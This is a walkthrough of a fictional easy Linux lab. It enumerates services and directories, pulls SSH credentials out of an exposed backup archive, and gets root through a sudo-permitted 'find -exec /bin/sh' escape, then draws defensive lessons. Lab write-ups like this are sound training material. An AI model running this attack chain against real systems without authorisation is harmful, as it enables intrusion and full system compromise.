LabBox-01 — Walkthrough

Platform: Hypothetical TryHackMe Room
Difficulty: Easy
OS: Linux
Target IP: 10.10.10.45
Date: October 8, 2026

1. Objective

Compromise target machine, obtain initial user access, escalate privileges to root, and retrieve both flags.

2. Reconnaissance

Nmap Scan

Initial service enumeration:

nmap -sC -sV 10.10.10.45

Results:

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    Apache httpd

Observations:

Port 22 provides SSH access.

Port 80 hosts a web application.

Web enumeration selected as the next step.

3. Web Enumeration

Directory Discovery

Used Gobuster to identify hidden directories:

gobuster dir \
-u http://10.10.10.45 \
-w /usr/share/wordlists/dirb/common.txt

Results:

/admin     (Status: 403)
/backup    (Status: 301)
/index.html (Status: 200)

Discovery

Navigating to /backup/ revealed a downloadable file:

site-backup.zip

Downloaded the archive:

curl -O http://10.10.10.45/backup/site-backup.zip

Extracted its contents:

unzip site-backup.zip

A configuration notes file exposed the following information:

Username: operator
Password: [REDACTED]

Finding: Sensitive credentials stored in publicly accessible backup.

4. Initial Access

SSH Authentication

Attempted SSH authentication using discovered credentials:

ssh operator@10.10.10.45

Result: Authentication successful.

Confirmed user context:

whoami

Output:

operator

User Flag

Located and retrieved user flag:

cat /home/operator/user.txt

Result: User flag obtained. Value omitted.

5. Privilege Escalation

Sudo Permissions

Enumerated available sudo permissions:

sudo -l

Output:

(root) NOPASSWD: /usr/bin/find

Exploitation

The find utility supports command execution through its -exec argument.

Because sudo permitted unrestricted execution of this utility, it could be used to spawn a privileged shell.

sudo find . -exec /bin/sh \; -quit

Verified privileges:

whoami

Output:

root

Root Flag

Retrieved final flag:

cat /root/root.txt

Result: Root flag obtained. Value omitted.

6. Attack Path Summary

Nmap Service Discovery
        |
        v
HTTP Enumeration
        |
        v
Gobuster Directory Discovery
        |
        v
Exposed Backup Archive
        |
        v
SSH Credentials Discovered
        |
        v
SSH Login (operator)
        |
        v
Sudo Permission Enumeration
        |
        v
Abuse of find Utility
        |
        v
Root Access Achieved

7. Key Takeaways

Vulnerabilities Identified:

Public exposure of sensitive backup files.

Excessive sudo permissions enabling privilege escalation.

Skills Practiced:

Port scanning and service identification

Web directory enumeration

File and credential analysis

SSH authentication

Linux privilege escalation

Lessons Learned:

Accessible backup files can expose credentials, and overly permissive sudo configurations can turn standard user access into complete system compromise.

Fictional lab scenario for educational purposes.